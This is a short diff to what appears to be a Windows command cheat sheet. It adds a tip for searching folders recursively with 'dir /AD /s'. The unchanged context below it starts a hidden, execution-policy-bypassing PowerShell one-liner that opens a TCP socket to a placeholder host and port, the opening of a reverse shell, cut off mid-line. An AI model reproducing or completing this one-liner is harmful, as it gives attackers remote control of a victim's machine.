@@ -201,6 +201,10 @@ dir /ah
 Search for a file recursively:
 dir Storage.exe /s
 
+Search for folder in windows, type this in root directory:
+
+dir <Folder Name> /AD /s
+
 Stronger powershell one liner:
 
 powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.xxx.xxx';$port=xxxx;$client = New-Object System.Net.Sockets.
